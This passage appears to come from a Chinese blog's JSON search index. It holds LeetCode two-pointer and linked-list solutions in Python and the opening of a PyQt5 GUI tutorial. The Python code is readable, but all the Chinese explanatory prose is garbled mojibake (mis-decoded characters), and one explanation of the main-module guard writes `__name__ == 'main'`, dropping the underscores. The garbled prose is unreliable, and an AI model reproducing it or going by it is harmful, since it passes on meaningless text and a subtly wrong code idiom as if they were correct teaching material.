ç§»åŠ¨åˆ°æ•°ç»„çš„æœ«å°¾ï¼ŒåŒæ—¶ä¿æŒéé›¶å…ƒç´ çš„ç›¸å¯¹é¡ºåºã€‚\n\n**ç¤ºä¾‹:**\n\n```\nè¾“å…¥: [0,1,0,3,12]\nè¾“å‡º: [1,3,12,0,0]\n```\n\n**è¯´æ˜**:\n\n1. å¿…é¡»åœ¨åŸæ•°ç»„ä¸Šæ“ä½œï¼Œä¸èƒ½æ‹·è´é¢å¤–çš„æ•°ç»„ã€‚\n2. å°½é‡å‡å°‘æ“ä½œæ¬¡æ•°ã€‚\n\n#### è§£ç­”\n\næ–¹æ³•ä¸€ï¼š\n\nç»™å®šä¸€ä¸ªæ•°ç»„ï¼Œæˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯å°†éé›¶çš„æ•°å­—ç§»åˆ°æ•°ç»„çš„å‰é¢ï¼Œå°†0ç§»åˆ°æ•°ç»„çš„æœ«å°¾ï¼ŒåŒæ—¶ä¸èƒ½ä½¿ç”¨é¢å¤–çš„ç©ºé—´ã€‚é¦–å…ˆä½¿ç”¨ä¸¤ä¸ªæŒ‡é’ˆï¼Œç¬¬ä¸€ä¸ªæŒ‡é’ˆ j ä»å‰å¾€åéå†æ‰€æœ‰çš„æ•°å­—ï¼Œç¬¬äºŒä¸ªæŒ‡é’ˆ i æŒ‡åœ¨æ•°ç»„ä¸­ 0 æ‰€åœ¨çš„ä½ç½®ï¼Œå½“ j é‡åˆ°é 0 çš„æ•°å­—æ—¶ï¼Œæˆ‘ä»¬å°±äº¤æ¢ num[i] å’Œ nums[j] çš„å€¼ã€‚\n\n![å›¾è§£](https://img.jwt1399.top//img/20210730210745.png)\n\n```python\nclass Solution:\n    def moveZeroes(self, nums: List[int]) -> None:\n        \"\"\"\n        Do not return anything, modify nums in-place instead.\n        \"\"\"\n        i = -1\n        for j in range(len(nums)):\n            if nums[j]!=0:\n                i+=1\n                nums[i],nums[j]= nums[j], nums[i]      \n                \n```\n\næ–¹æ³•äºŒï¼š\n\nå³æŒ‡é’ˆä¸æ–­å‘å³ç§»åŠ¨ï¼Œæ¯æ¬¡å³æŒ‡é’ˆæŒ‡å‘éé›¶æ•°ï¼Œåˆ™å°†å·¦å³æŒ‡é’ˆå¯¹åº”çš„æ•°äº¤æ¢ï¼ŒåŒæ—¶å·¦æŒ‡é’ˆå³ç§»ã€‚å› æ­¤æ¯æ¬¡äº¤æ¢ï¼Œéƒ½æ˜¯å°†å·¦æŒ‡é’ˆçš„é›¶ä¸å³æŒ‡é’ˆçš„éé›¶æ•°äº¤æ¢ï¼Œä¸”éé›¶æ•°çš„ç›¸å¯¹é¡ºåºå¹¶æœªæ”¹å˜ã€‚æœ€ç»ˆå·¦æŒ‡é’ˆå·¦è¾¹å‡ä¸ºéé›¶æ•°ï¼›å³æŒ‡é’ˆå·¦è¾¹ç›´åˆ°å·¦æŒ‡é’ˆå¤„å‡ä¸ºé›¶ã€‚\n\n```python\nclass Solution:\n    def moveZeroes(self, nums: List[int]) -> None:\n        \"\"\"\n        Do not return anything, modify nums in-place instead.\n        \"\"\"\n        n = len(nums)\n        left = right = 0\n        while right < n:\n            if nums[right] != 0:\n                nums[left], nums[right] = nums[right], nums[left]\n                left += 1\n            right += 1\n```\n\n### 167. ä¸¤æ•°ä¹‹å’Œ II - è¾“å…¥æœ‰åºæ•°ç»„\n\n#### é¢˜ç›®\n\nç»™å®šä¸€ä¸ªå·²æŒ‰ç…§ **å‡åºæ’åˆ—** çš„æ•´æ•°æ•°ç»„ `numbers` ï¼Œè¯·ä½ ä»æ•°ç»„ä¸­æ‰¾å‡ºä¸¤ä¸ªæ•°æ»¡è¶³ç›¸åŠ ä¹‹å’Œç­‰äºç›®æ ‡æ•° `target` ã€‚\n\nå‡½æ•°åº”è¯¥ä»¥é•¿åº¦ä¸º `2` çš„æ•´æ•°æ•°ç»„çš„å½¢å¼è¿”å›è¿™ä¸¤ä¸ªæ•°çš„ä¸‹æ ‡å€¼*ã€‚*`numbers` çš„ä¸‹æ ‡ **ä» 1 å¼€å§‹è®¡æ•°** ï¼Œæ‰€ä»¥ç­”æ¡ˆæ•°ç»„åº”å½“æ»¡è¶³ `1 <= answer[0] < answer[1] <= numbers.length` ã€‚\n\nä½ å¯ä»¥å‡è®¾æ¯ä¸ªè¾“å…¥åªå¯¹åº”å”¯ä¸€çš„ç­”æ¡ˆï¼Œè€Œä¸”ä½ ä¸å¯ä»¥é‡å¤ä½¿ç”¨ç›¸åŒçš„å…ƒç´ ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```\nè¾“å…¥ï¼šnumbers = [2,7,11,15], target = 9\nè¾“å‡ºï¼š[1,2]\nè§£é‡Šï¼š2 ä¸ 7 ä¹‹å’Œç­‰äºç›®æ ‡æ•° 9 ã€‚å› æ­¤ index1 = 1, index2 = 2 ã€‚\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```\nè¾“å…¥ï¼šnumbers = [2,3,4], target = 6\nè¾“å‡ºï¼š[1,3]\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```\nè¾“å…¥ï¼šnumbers = [-1,0], target = -1\nè¾“å‡ºï¼š[1,2]\n```\n\n**æç¤ºï¼š**\n\n- `2 <= numbers.length <= 3 * 104`\n- `-1000 <= numbers[i] <= 1000`\n- `numbers` æŒ‰ **é€’å¢é¡ºåº** æ’åˆ—\n- `-1000 <= target <= 1000`\n- ä»…å­˜åœ¨ä¸€ä¸ªæœ‰æ•ˆç­”æ¡ˆ\n\n#### è§£ç­”\n\nåˆå§‹çŠ¶æ€ä¸‹ï¼Œä»¤ left æŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œright æŒ‡å‘æœ€åä¸€ä¸ªå…ƒç´ ï¼Œè¿›å…¥å¾ªç¯ï¼Œæ§åˆ¶å¾ªç¯çš„é€€å‡ºæ¡ä»¶ä¸º left >= right ,åœ¨æ¯ä¸€æ¬¡å¾ªç¯ä¸­å¦‚æœ left ä¸ right æ•°å­—ä¹‹å’Œç­‰äº target ,åˆ™è¿”å›å½“å‰çš„ left,rightï¼›è‹¥ left ä¸ right æ•°å­—ä¹‹å’Œå°äº target ï¼Œleft += 1ï¼Œç»§ç»­å¾ªç¯ï¼›è‹¥ left ä¸ right æ•°å­—ä¹‹å’Œå¤§äº target ï¼Œright -= 1ï¼Œç»§ç»­å¾ªç¯ï¼›\n\n```python\nclass Solution:\n    def twoSum(self, numbers: List[int], target: int) -> List[int]:   \n        left, right = 0, len(numbers) - 1\n        while left < right:\n            if numbers[left] + numbers[right] == target:\n                return [left+1,right+1]\n            elif numbers[left] + numbers[right] < target:\n                left += 1\n            else:\n                right -= 1\n        return [-1,-1]\n```\n\n### å¤æ‚åº¦\n\n- æ—¶é—´å¤æ‚åº¦ï¼š$\\mathcal{O}(n)$â€‹â€‹â€‹â€‹\n- ç©ºé—´å¤æ‚åº¦ï¼š$\\mathcal{O}(1)$â€‹ã€‚\n\n### 344. åè½¬å­—ç¬¦ä¸²\n\n#### é¢˜ç›®\n\nç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œå…¶ä½œç”¨æ˜¯å°†è¾“å…¥çš„å­—ç¬¦ä¸²åè½¬è¿‡æ¥ã€‚è¾“å…¥å­—ç¬¦ä¸²ä»¥å­—ç¬¦æ•°ç»„ `char[]` çš„å½¢å¼ç»™å‡ºã€‚\n\nä¸è¦ç»™å¦å¤–çš„æ•°ç»„åˆ†é…é¢å¤–çš„ç©ºé—´ï¼Œä½ å¿…é¡»åŸåœ°ä¿®æ”¹è¾“å…¥æ•°ç»„ã€ä½¿ç”¨ O(1) çš„é¢å¤–ç©ºé—´è§£å†³è¿™ä¸€é—®é¢˜ã€‚\n\nä½ å¯ä»¥å‡è®¾æ•°ç»„ä¸­çš„æ‰€æœ‰å­—ç¬¦éƒ½æ˜¯ ASCII ç è¡¨ä¸­çš„å¯æ‰“å°å­—ç¬¦ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```\nè¾“å…¥ï¼š[\"h\",\"e\",\"l\",\"l\",\"o\"]\nè¾“å‡ºï¼š[\"o\",\"l\",\"l\",\"e\",\"h\"]\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```\nè¾“å…¥ï¼š[\"H\",\"a\",\"n\",\"n\",\"a\",\"h\"]\nè¾“å‡ºï¼š[\"h\",\"a\",\"n\",\"n\",\"a\",\"H\"]\n```\n\n#### è§£ç­”\n\næ–¹æ³•ä¸€ï¼šåŒæŒ‡é’ˆ\n\n```python\nclass Solution:\n    def reverseString(self, s: List[str]) -> None:\n        \"\"\"\n        Do not return anything, modify s in-place instead.\n        \"\"\"\n        left, right =0, len(s)-1\n        while left <= right:\n            s[left],s[right] = s[right],s[left]\n            left += 1\n            right -= 1\n```\n\næ–¹æ³•äºŒï¼šåº“å‡½æ•°\n\n- `s[::-1]` è¡¨ç¤ºåè½¬ s ä¸­çš„å…ƒç´ \n- `s[:]`  è¡¨ç¤ºæ•°ç»„ä¸­æ‰€æœ‰å…ƒç´ \n- `s[:]=s[::-1]` è¡¨ç¤ºå°†åŸæ•°ç»„åè½¬åèµ‹å€¼ç»™ s ä¸­æ¯ä¸€ä¸ªå¯¹åº”çš„ä½ç½®\n- `s=s[::-1]` è¡¨ç¤ºå°† s åè½¬åèµ‹å€¼ç»™æ–°çš„å¯¹è±¡ sï¼ˆå¯ä»¥é€šè¿‡idå‡½æ•°æŸ¥çœ‹å†…å­˜åœ°å€ï¼‰ï¼Œä¸é¢˜æ„åŸåœ°ä¿®æ”¹ä¸ç¬¦ã€‚\n\n```python\nclass Solution:\n    def reverseString(self, s: List[str]) -> None:\n        \"\"\"\n        Do not return anything, modify s in-place instead.\n        \"\"\"\n        s[:]=s[::-1]\n```\n\n### 557. åè½¬å­—ç¬¦ä¸²ä¸­çš„å•è¯ III\n\n#### é¢˜ç›®\n\nç»™å®šä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä½ éœ€è¦åè½¬å­—ç¬¦ä¸²ä¸­æ¯ä¸ªå•è¯çš„å­—ç¬¦é¡ºåºï¼ŒåŒæ—¶ä»ä¿ç•™ç©ºæ ¼å’Œå•è¯çš„åˆå§‹é¡ºåºã€‚\n\n**ç¤ºä¾‹ï¼š**\n\n```\nè¾“å…¥ï¼š\"Let's take LeetCode contest\"\nè¾“å‡ºï¼š\"s'teL ekat edoCteeL tsetnoc\"\n```\n\n**æç¤ºï¼š**\n\n- åœ¨å­—ç¬¦ä¸²ä¸­ï¼Œæ¯ä¸ªå•è¯ç”±å•ä¸ªç©ºæ ¼åˆ†éš”ï¼Œå¹¶ä¸”å­—ç¬¦ä¸²ä¸­ä¸ä¼šæœ‰ä»»ä½•é¢å¤–çš„ç©ºæ ¼ã€‚\n\n#### è§£ç­”\n\næ–¹æ³•ä¸€ï¼šå°†å­—ç¬¦ä¸²åˆ†å‰²æˆå•è¯åˆ—è¡¨ï¼Œç„¶åæŠŠæ¯ä¸ªå•è¯åè½¬å†æ‹¼æ¥\n\n```python\nclass Solution(object):\n    def reverseWords(self, s):\n        return \" \".join(word[::-1] for word in s.split(\" \"))\n```\n\n- `s.split(\" \")` ä»¥ç©ºæ ¼ä¸ºåˆ†éš”ç¬¦å°†å­—ç¬¦ä¸²åˆ†å‰²æˆå•è¯åˆ—è¡¨\n\n- `[::-1]`   \t\t     å°†å•è¯åè½¬\n- `\" \".join()`     å°†å•è¯åˆ—è¡¨è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œä»¥ç©ºæ ¼åˆ†éš”\n\næ–¹æ³•äºŒï¼šåˆ©ç”¨ä¸¤æ¬¡åˆ‡ç‰‡ï¼Œä¸éœ€éå†\n\n```python\nclass Solution(object):\n    def reverseWords(self, s):\n        return \" \".join(s.split(\" \")[::-1])[::-1]\n```\n\nä»¥å­—ç¬¦ä¸² â€œI love drag queenâ€ ä¸ºä¾‹ï¼š\n\n- s.split(\" \") å°†å­—ç¬¦ä¸²åˆ†å‰²æˆå•è¯åˆ—è¡¨:\n\n```\n['I', 'love', 'drag', 'queen']\n```\n\n- s.split(\" \")[::-1] å°†å•è¯åˆ—è¡¨åè½¬:\n\n```\n['queen', 'drag', 'love', 'I']\n```\n\n- \" \".join(s.split(\" \")[::-1]) å°†å•è¯åˆ—è¡¨è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œä»¥ç©ºæ ¼åˆ†éš”:\n\n```\n\"queen drag love I\"\n```\n\n- \" \".join(s.split(\" \")[::-1])[::-1] å°†å­—ç¬¦ä¸²åè½¬ï¼š\n\n```\nâ€I evol gard neeuqâ€œ\n```\n\n## é“¾è¡¨\n\n### 876. é“¾è¡¨çš„ä¸­é—´ç»“ç‚¹\n\n#### é¢˜ç›®\n\nç»™å®šä¸€ä¸ªå¤´ç»“ç‚¹ä¸º `head` çš„éç©ºå•é“¾è¡¨ï¼Œè¿”å›é“¾è¡¨çš„ä¸­é—´ç»“ç‚¹ã€‚å¦‚æœæœ‰ä¸¤ä¸ªä¸­é—´ç»“ç‚¹ï¼Œåˆ™è¿”å›ç¬¬äºŒä¸ªä¸­é—´ç»“ç‚¹ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```\nè¾“å…¥ï¼š[1,2,3,4,5]\nè¾“å‡ºï¼šæ­¤åˆ—è¡¨ä¸­çš„ç»“ç‚¹ 3 (åºåˆ—åŒ–å½¢å¼ï¼š[3,4,5])\nè¿”å›çš„ç»“ç‚¹å€¼ä¸º 3 ã€‚ (æµ‹è¯„ç³»ç»Ÿå¯¹è¯¥ç»“ç‚¹åºåˆ—åŒ–è¡¨è¿°æ˜¯ [3,4,5])ã€‚\næ³¨æ„ï¼Œæˆ‘ä»¬è¿”å›äº†ä¸€ä¸ª ListNode ç±»å‹çš„å¯¹è±¡ ansï¼Œè¿™æ ·ï¼š\nans.val = 3, ans.next.val = 4, ans.next.next.val = 5, ä»¥åŠ ans.next.next.next = NULL.\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```\nè¾“å…¥ï¼š[1,2,3,4,5,6]\nè¾“å‡ºï¼šæ­¤åˆ—è¡¨ä¸­çš„ç»“ç‚¹ 4 (åºåˆ—åŒ–å½¢å¼ï¼š[4,5,6])\nç”±äºè¯¥åˆ—è¡¨æœ‰ä¸¤ä¸ªä¸­é—´ç»“ç‚¹ï¼Œå€¼åˆ†åˆ«ä¸º 3 å’Œ 4ï¼Œæˆ‘ä»¬è¿”å›ç¬¬äºŒä¸ªç»“ç‚¹ã€‚\n```\n\n**æç¤ºï¼š**\n\n- ç»™å®šé“¾è¡¨çš„ç»“ç‚¹æ•°ä»‹äº `1` å’Œ `100` ä¹‹é—´ã€‚\n\n#### è§£ç­”\n\nç”¨ä¸¤ä¸ªæŒ‡é’ˆ `slow` ä¸ `fast` ä¸€èµ·éå†é“¾è¡¨ã€‚`slow` ä¸€æ¬¡èµ°ä¸€æ­¥ï¼Œ`fast` ä¸€æ¬¡èµ°ä¸¤æ­¥ã€‚é‚£ä¹ˆå½“ `fast` åˆ°è¾¾é“¾è¡¨çš„æœ«å°¾æ—¶ï¼Œ`slow` å¿…ç„¶ä½äºä¸­é—´ã€‚å¿«æŒ‡é’ˆå¯ä»¥å‰è¿›çš„æ¡ä»¶æ˜¯å½“å‰å¿«æŒ‡é’ˆä¸‹ä¸€ä¸ªèŠ‚ç‚¹å’Œä¸‹ä¸‹ä¸ªèŠ‚ç‚¹éƒ½éç©ºã€‚\n\n```python\n# Definition for singly-linked list.\n# class ListNode:\n#     def __init__(self, val=0, next=None):\n#         self.val = val\n#         self.next = next\nclass Solution:\n    def middleNode(self, head: ListNode) -> ListNode:\n        slow = fast = head \n        while fast and fast.next:\n            slow = slow.next\n            fast = fast.next.next\n        return slow\n```\n\n### 19. åˆ é™¤é“¾è¡¨çš„å€’æ•°ç¬¬ N ä¸ªç»“ç‚¹\n\n#### é¢˜ç›®\n\nç»™ä½ ä¸€ä¸ªé“¾è¡¨ï¼Œåˆ é™¤é“¾è¡¨çš„å€’æ•°ç¬¬ `n` ä¸ªç»“ç‚¹ï¼Œå¹¶ä¸”è¿”å›é“¾è¡¨çš„å¤´ç»“ç‚¹ã€‚\n\n**è¿›é˜¶ï¼š**ä½ èƒ½å°è¯•ä½¿ç”¨ä¸€è¶Ÿæ‰«æå®ç°å—ï¼Ÿ\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2020/10/03/remove_ex1.jpg)\n\n```\nè¾“å…¥ï¼šhead = [1,2,3,4,5], n = 2\nè¾“å‡ºï¼š[1,2,3,5]\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```\nè¾“å…¥ï¼šhead = [1], n = 1\nè¾“å‡ºï¼š[]\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```\nè¾“å…¥ï¼šhead = [1,2], n = 1\nè¾“å‡ºï¼š[1]\n```\n\n**æç¤ºï¼š**\n\n- é“¾è¡¨ä¸­ç»“ç‚¹çš„æ•°ç›®ä¸º `sz`\n- `1 <= sz <= 30`\n- `0 <= Node.val <= 100`\n- `1 <= n <= sz`\n\n#### è§£ç­”\n\næ–¹æ³•ä¸€ï¼šå¾ªç¯è¿­ä»£-- æ‰¾åˆ° length -n ä¸ªèŠ‚ç‚¹\n\nå…ˆä»å¤´èŠ‚ç‚¹å¼€å§‹å¯¹é“¾è¡¨è¿›è¡Œä¸€æ¬¡éå†ï¼Œå¾—åˆ°é“¾è¡¨çš„é•¿åº¦ Lã€‚éšåæˆ‘ä»¬å†ä»å¤´èŠ‚ç‚¹å¼€å§‹å¯¹é“¾è¡¨è¿›è¡Œä¸€æ¬¡éå†ï¼Œå½“éå†åˆ°ç¬¬ L-n ä¸ªèŠ‚ç‚¹æ—¶ï¼Œå®ƒå°±æ˜¯æˆ‘ä»¬éœ€è¦åˆ é™¤çš„èŠ‚ç‚¹ã€‚\n\nåˆ é™¤çš„æ–¹æ³•æ˜¯ï¼šæ‰¾åˆ°è¢«åˆ é™¤èŠ‚ç‚¹çš„å‰ç½®èŠ‚ç‚¹ï¼Œç„¶åå°†å‰ç½®èŠ‚ç‚¹çš„ next æŒ‡é’ˆæŒ‡å‘è¯¥èŠ‚ç‚¹çš„åç½®èŠ‚ç‚¹ã€‚\n\n```python\n# Definition for singly-linked list.\n# class ListNode:\n#     def __init__(self, val=0, next=None):\n#         self.val = val\n#         self.next = next\nclass Solution:\n    def removeNthFromEnd(self, head: ListNode, n: int) -> ListNode:\n        dummy = ListNode(0, head) #å®šä¹‰å“‘èŠ‚ç‚¹ï¼Œæ”¾åœ¨å¤´èŠ‚ç‚¹å‰é¢\n        \n        #step1: è·å–é“¾è¡¨é•¿åº¦\n        cur, length = head, 0 \n        while cur:\n            length += 1\n            cur = cur.next \n        \n        #step2: æ‰¾åˆ°å€’æ•°ç¬¬Nä¸ªèŠ‚ç‚¹çš„å‰é¢ä¸€ä¸ªèŠ‚ç‚¹\n        cur = dummy\n        for i in range(length - n):\n            cur = cur.next\n        \n        #step3: åˆ é™¤èŠ‚ç‚¹ï¼Œå¹¶é‡æ–°è¿æ¥\n        cur.next = cur.next.next\n        return dummy.next \n```\n\næ–¹æ³•äºŒï¼šå¿«æ…¢æŒ‡é’ˆ -- æ‰¾å€’æ•°ç¬¬Nä¸ªèŠ‚ç‚¹çš„å‰ä¸€ä¸ªèŠ‚ç‚¹\n\nè®¾å®šåŒæŒ‡é’ˆ slow å’Œ fast ï¼Œå½“ fast æŒ‡å‘æœ«å°¾çš„ NULLï¼Œslow  ä¸ fast ä¹‹é—´ç›¸éš”çš„å…ƒç´ ä¸ªæ•°ä¸º n æ—¶ï¼Œé‚£ä¹ˆåˆ é™¤æ‰ slow  çš„ä¸‹ä¸€ä¸ªæŒ‡é’ˆå°±å®Œæˆäº†è¦æ±‚ã€‚\n\n- è®¾ç½®è™šæ‹ŸèŠ‚ç‚¹ dummy æŒ‡å‘ head\n- è®¾å®šåŒæŒ‡é’ˆ slow  å’Œ fastï¼Œåˆå§‹éƒ½æŒ‡å‘è™šæ‹ŸèŠ‚ç‚¹ dummy\n- ç§»åŠ¨ fastï¼Œç›´åˆ° slow ä¸ fast ä¹‹é—´ç›¸éš”çš„å…ƒç´ ä¸ªæ•°ä¸º n\n- å†åŒæ—¶ç§»åŠ¨ slow  ä¸ fast ï¼Œç›´åˆ° fast  æŒ‡å‘çš„ä¸º NULL\n- å°† slow çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹æŒ‡å‘ä¸‹ä¸‹ä¸ªèŠ‚ç‚¹\n\n![](https://pic.leetcode-cn.com/cc43daa8cbb755373ce4c5cd10c44066dc770a34a6d2913a52f8047cbf5e6e56-file_1559548337458)\n\n```python\n# Definition for singly-linked list.\n# class ListNode:\n#     def __init__(self, val=0, next=None):\n#         self.val = val\n#         self.next = next\nclass Solution:\n    def removeNthFromEnd(self, head: ListNode, n: int) -> ListNode:\n        dummy = ListNode(0, head) #å®šä¹‰å“‘èŠ‚ç‚¹ï¼Œæ”¾åœ¨å¤´èŠ‚ç‚¹å‰é¢\n        \n        #step1: å¿«æŒ‡é’ˆå…ˆèµ°næ­¥\n        slow, fast = dummy, dummy\n        for i in range(n):\n            fast = fast.next \n\n        #step2: å¿«æ…¢æŒ‡é’ˆåŒæ—¶èµ°ï¼Œç›´åˆ°fastæŒ‡é’ˆåˆ°è¾¾å°¾éƒ¨èŠ‚ç‚¹ï¼Œæ­¤æ—¶slowåˆ°è¾¾å€’æ•°ç¬¬Nä¸ªèŠ‚ç‚¹çš„å‰ä¸€ä¸ªèŠ‚ç‚¹\n        while fast and fast.next:\n            slow, fast = slow.next, fast.next \n        \n        #step3: åˆ é™¤èŠ‚ç‚¹ï¼Œå¹¶é‡æ–°è¿æ¥\n        slow.next = slow.next.next \n        return dummy.next \n```\n\n###\n\n<table>\n    <tbody>\n        <tr>\n            <td><input type=\"text\" placeholder=\"ğŸ””è¯·è¾“å…¥æ–‡ç« æŸ¥çœ‹ç ï¼Œçœ‹æ›´å¤šå†…å®¹\"></td>\n            <td><button class=\"btn\">Button</button></td>\n        </tr>\n</tbody></table>\n\n\n\n# èµåŠ©ğŸ’°\n\nå¦‚æœä½ è§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥è¯·æˆ‘å–ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["ç®—æ³•"],"categories":["Python"]},{"title":"Pythonï¼šPyQtå­¦ä¹ ","url":"/posts/41724.html","content":"\n> PyQtæ˜¯ä¸€ä¸ªç”¨äºåˆ›å»ºGUIåº”ç”¨ç¨‹åºçš„è·¨å¹³å°å·¥å…·åŒ…ï¼Œå®ƒå°†Pythonä¸Qtåº“èä¸ºä¸€ä½“ã€‚PyQtå…è®¸ä½¿ç”¨Pythonè¯­è¨€è°ƒç”¨Qtåº“ä¸­çš„APIã€‚è¿™æ ·åšçš„æœ€å¤§å¥½å¤„å°±æ˜¯åœ¨ä¿ç•™äº†Qté«˜è¿è¡Œæ•ˆç‡çš„åŒæ—¶ï¼Œå¤§å¤§æé«˜äº†å¼€å‘æ•ˆç‡ã€‚\n\n# åŸºç¡€\n\n## ç¬¬ä¸€ä¸ª PyQt ç¨‹åº\n\n### å®‰è£…PyQt5\n\n```shell\npip install pyqt5-tools\n```\n\nå³å¯åŒæ—¶å®‰è£… PyQt5 å’Œä¸€äº›é‡è¦çš„å·¥å…·ï¼Œæ¯”å¦‚ Qt designerã€‚\n\n### åŸºç¡€ä»£ç \n\n```python\nfrom PyQt5.QtWidgets import QApplication, QMainWindow\n#from PyQt5.Qt import *   # å¯¼å…¥æ‰€æœ‰åŒ…\nimport sys\n\n#åˆ›å»ºåº”ç”¨ç¨‹åºå¯¹è±¡\napp = QApplication(sys.argv)\n# åˆ›å»ºæ§ä»¶\nwindow = QMainWindow()\n# è®¾ç½®æ§ä»¶\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle('ç¬¬ä¸€ä¸ªçª—å£')\n# å±•ç¤ºæ§ä»¶\nwindow.show()\nsys.exit(app.exec_())\n```\n\n### å°è£…åˆ°ç±»ä¸­\n\nä¸Šé¢çš„ä»£ç æŠŠæ§ä»¶å¯¹åº”çš„å˜é‡åå…¨éƒ¨ä½œä¸ºå…¨å±€å˜é‡ã€‚å¦‚æœè¦è®¾è®¡ç¨å¾®å¤æ‚ä¸€äº›çš„ç¨‹åºï¼Œå°±ä¼šå‡ºç°å¤ªå¤šçš„æ§ä»¶å¯¹åº”çš„å˜é‡åã€‚è€Œä¸”è¿™æ ·ä¹Ÿä¸åˆ©äºä»£ç çš„æ¨¡å—åŒ–ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬é€šå¸¸åº”è¯¥æŠŠ ä¸€ä¸ªçª—å£å’Œå…¶åŒ…å«çš„æ§ä»¶ï¼Œå¯¹åº”çš„ä»£ç å…¨éƒ¨å°è£…åˆ°ç±»ä¸­ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\n\n```python\nfrom PyQt5.QtWidgets import QApplication, QMainWindow\nimport sys\n\nclass Window():\n    def __init__(self):\n        self.window = QMainWindow()\n        self.window.resize(500, 400)\n        self.window.move(300, 300)\n        self.window.setWindowTitle('ç¬¬ä¸€ä¸ªçª—å£')\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv)\n    stats = Window()\n    stats.window.show()\n    sys.exit(app.exec_())\n```\n\n`if __name__ == '__main__':` ä½œç”¨ï¼špythonæ–‡ä»¶é€šå¸¸æœ‰ä¸¤ç§ä½¿ç”¨æ–¹æ³•ï¼Œç¬¬ä¸€æ˜¯ä½œä¸ºè„šæœ¬ç›´æ¥æ‰§è¡Œï¼Œç¬¬äºŒæ˜¯ import åˆ°å…¶ä»–çš„ python è„šæœ¬ä¸­è¢«è°ƒç”¨ï¼ˆæ¨¡å—é‡ç”¨ï¼‰æ‰§è¡Œã€‚å› æ­¤ `if __name__ == 'main':` çš„ä½œç”¨å°±æ˜¯æ§åˆ¶è¿™ä¸¤ç§æƒ…å†µæ‰§è¡Œä»£ç çš„è¿‡ç¨‹ï¼Œåœ¨ `if __name__ == 'main':` ä¸‹çš„ä»£ç åªæœ‰åœ¨ç¬¬ä¸€ç§æƒ…å†µä¸‹ï¼ˆå³æ–‡ä»¶ä½œä¸ºè„šæœ¬ç›´æ¥æ‰§è¡Œï¼‰æ‰ä¼šè¢«æ‰§è¡Œï¼Œè€Œ import åˆ°å…¶ä»–è„šæœ¬ä¸­æ˜¯ä¸ä¼šè¢«æ‰§è¡Œçš„ï¼Œå› æ­¤å¯ä»¥åœ¨`if __name__ == 'main':`ä¸‹æ”¾è¿™ä¸ªPython æ–‡ä»¶çš„æµ‹è¯•ä»£ç ï¼Œå³ import åˆ°å…¶ä»–çš„ python è„šæœ¬ä¸­ä¸ä¼šè¢«æ‰§è¡Œçš„ä»£ç  ã€‚\n\n### é¢å‘å¯¹è±¡ç‰ˆæœ¬\n\n> é¢å‘å¯¹è±¡å°±æ˜¯åœ¨ç¼–ç¨‹çš„æ—¶å€™å°½å¯èƒ½çš„å»æ¨¡æ‹ŸçœŸå®çš„ç°å®ä¸–ç•Œï¼ŒæŒ‰ç…§ç°å®ä¸–ç•Œä¸­çš„é€»è¾‘å»å¤„ç†ä¸€ä¸ªé—®é¢˜ï¼Œåˆ†æé—®é¢˜ä¸­å‚ä¸å…¶ä¸­çš„æœ‰å“ªäº›å®ä½“ï¼Œè¿™äº›å®ä½“åº”è¯¥æœ‰ä»€ä¹ˆå±æ€§å’Œæ–¹æ³•ï¼Œæˆ‘ä»¬å¦‚ä½•é€šè¿‡è°ƒç”¨è¿™äº›å®ä½“çš„å±æ€§å’Œæ–¹æ³•å»è§£å†³é—®é¢˜ã€‚\n>\n> é¢å‘è¿‡ç¨‹å°±æ˜¯é¢å‘è§£å†³é—®é¢˜çš„è¿‡ç¨‹è¿›è¡Œç¼–ç¨‹ã€‚æ˜¯ä¸€ç§ä»¥äº‹ä»¶ä¸ºä¸­å¿ƒçš„ç¼–ç¨‹æ€æƒ³ï¼Œç¼–ç¨‹çš„æ—¶å€™æŠŠè§£å†³é—®é¢˜çš„æ­¥éª¤åˆ†æå‡ºæ¥ï¼Œç„¶åç”¨å‡½æ•°æŠŠè¿™äº›æ­¥éª¤å®ç°ï¼Œåœ¨ä¸€æ­¥ä¸€æ­¥çš„å…·ä½“æ­¥éª¤ä¸­å†æŒ‰é¡ºåºè°ƒç”¨å‡½æ•°ã€‚\n\n```python\nfrom PyQt5.QtWidgets import QApplication, QMainWindow,QLabel\nimport sys\n\nclass Window(QMainWindow):\n    def __init__(self):\n        super().__init__() # ç»§æ‰¿çˆ¶ç±»çš„initæ–¹æ³•\n        self.resize(500, 400)\n        self.move(300, 300)\n        self.setWindowTitle('ç¬¬ä¸€ä¸ªçª—å£')\n        self.setup_ui()\n\n    def setup_ui(self):\n        label = QLabel(self)\n        label.setText(\"è¿™æ˜¯ä¸€ä¸ªæ ‡ç­¾\")\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv)\n    window = Window()\n    